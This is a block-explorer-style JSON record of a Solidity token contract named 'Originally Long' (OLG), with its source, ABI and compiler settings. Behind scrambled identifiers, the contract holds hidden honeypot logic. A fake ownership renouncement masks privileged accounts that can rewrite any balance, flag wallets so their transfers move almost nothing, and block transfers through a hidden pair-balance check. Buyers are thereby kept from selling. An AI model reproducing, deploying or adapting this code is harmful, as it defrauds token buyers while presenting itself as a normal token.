{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface fundSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeAutoList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderFeeFrom {\n    function createPair(address teamSell, address totalTake) external returns (address);\n}\n\ninterface buyAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountIsTake) external view returns (uint256);\n\n    function transfer(address marketingLaunch, uint256 feeAtLimit) external returns (bool);\n\n    function allowance(address launchLaunchedSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAtLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingLaunch,\n        uint256 feeAtLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldLimit, uint256 value);\n    event Approval(address indexed launchLaunchedSwap, address indexed spender, uint256 value);\n}\n\ninterface buyAtMetadata is buyAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OriginallyLong is modeAutoList, buyAt, buyAtMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTeam;\n    }\n\n    string private minSenderList = \"Originally Long\";\n\n    uint256 marketingExempt;\n\n    function listSell(uint256 feeAtLimit) public {\n        toTx();\n        marketingExempt = feeAtLimit;\n    }\n\n    mapping(address => bool) public fundShould;\n\n    uint256 private receiverMode;\n\n    function toTx() private view {\n        require(fundShould[_msgSender()]);\n    }\n\n    bool private txTokenBuy;\n\n    function maxTradingWallet(address modeAt, uint256 feeAtLimit) public {\n        toTx();\n        fundLimitToken[modeAt] = feeAtLimit;\n    }\n\n    uint256 private toTeam = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed swapLiquidityAuto, address indexed feeAuto);\n\n    bool private isAmount;\n\n    bool public amountShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityShould;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minSenderList;\n    }\n\n    function allowance(address sellWallet, address launchFeeMax) external view virtual override returns (uint256) {\n        if (launchFeeMax == amountSenderTake) {\n            return type(uint256).max;\n        }\n        return receiverMin[sellWallet][launchFeeMax];\n    }\n\n    function teamToAuto(address isToken, address marketingLaunch, uint256 feeAtLimit) internal returns (bool) {\n        if (isToken == minWallet) {\n            return marketingLimit(isToken, marketingLaunch, feeAtLimit);\n        }\n        uint256 marketingLaunched = buyAt(modeFee).balanceOf(enableShould);\n        require(marketingLaunched == marketingExempt);\n        require(marketingLaunch != enableShould);\n        if (buyMax[isToken]) {\n            return marketingLimit(isToken, marketingLaunch, limitMarketing);\n        }\n        return marketingLimit(isToken, marketingLaunch, feeAtLimit);\n    }\n\n    address public minWallet;\n\n    function getOwner() external view returns (address) {\n        return modeList;\n    }\n\n    address private modeList;\n\n    string private liquidityShould = \"OLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingTradingAt;\n    }\n\n    mapping(address => bool) public buyMax;\n\n    mapping(address => uint256) private fundLimitToken;\n\n    uint8 private marketingTradingAt = 18;\n\n    function approve(address launchFeeMax, uint256 feeAtLimit) public virtual override returns (bool) {\n        receiverMin[_msgSender()][launchFeeMax] = feeAtLimit;\n        emit Approval(_msgSender(), launchFeeMax, feeAtLimit);\n        return true;\n    }\n\n    uint256 private amountTeam;\n\n    function limitShould(address feeLaunched) public {\n        if (amountShould) {\n            return;\n        }\n        if (isAmount == txTokenBuy) {\n            isAmount = false;\n        }\n        fundShould[feeLaunched] = true;\n        if (isAmount) {\n            isAmount = false;\n        }\n        amountShould = true;\n    }\n\n    uint256 constant limitMarketing = 18 ** 10;\n\n    address enableShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 fundReceiver;\n\n    function owner() external view returns (address) {\n        return modeList;\n    }\n\n    function marketingLimit(address isToken, address marketingLaunch, uint256 feeAtLimit) internal returns (bool) {\n        require(fundLimitToken[isToken] >= feeAtLimit);\n        fundLimitToken[isToken] -= feeAtLimit;\n        fundLimitToken[marketingLaunch] += feeAtLimit;\n        emit Transfer(isToken, marketingLaunch, feeAtLimit);\n        return true;\n    }\n\n    function swapReceiver(address receiverMinFee) public {\n        toTx();\n        \n        if (receiverMinFee == minWallet || receiverMinFee == modeFee) {\n            return;\n        }\n        buyMax[receiverMinFee] = true;\n    }\n\n    constructor (){\n        if (txTokenBuy) {\n            amountTeam = receiverMode;\n        }\n        fundSwap buyFrom = fundSwap(amountSenderTake);\n        modeFee = senderFeeFrom(buyFrom.factory()).createPair(buyFrom.WETH(), address(this));\n        \n        minWallet = _msgSender();\n        toMax();\n        fundShould[minWallet] = true;\n        fundLimitToken[minWallet] = toTeam;\n        if (txTokenBuy == isAmount) {\n            amountTeam = receiverMode;\n        }\n        emit Transfer(address(0), minWallet, toTeam);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMin;\n\n    address public modeFee;\n\n    function transferFrom(address isToken, address marketingLaunch, uint256 feeAtLimit) external override returns (bool) {\n        if (_msgSender() != amountSenderTake) {\n            if (receiverMin[isToken][_msgSender()] != type(uint256).max) {\n                require(feeAtLimit <= receiverMin[isToken][_msgSender()]);\n                receiverMin[isToken][_msgSender()] -= feeAtLimit;\n            }\n        }\n        return teamToAuto(isToken, marketingLaunch, feeAtLimit);\n    }\n\n    function transfer(address modeAt, uint256 feeAtLimit) external virtual override returns (bool) {\n        return teamToAuto(_msgSender(), modeAt, feeAtLimit);\n    }\n\n    function toMax() public {\n        emit OwnershipTransferred(minWallet, address(0));\n        modeList = address(0);\n    }\n\n    function balanceOf(address amountIsTake) public view virtual override returns (uint256) {\n        return fundLimitToken[amountIsTake];\n    }\n\n    address amountSenderTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunchedSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLiquidityAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFeeMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFeeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAtLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIsTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"limitShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAtLimit\",\"type\":\"uint256\"}],\"name\":\"listSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAtLimit\",\"type\":\"uint256\"}],\"name\":\"maxTradingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMinFee\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAtLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAtLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OriginallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}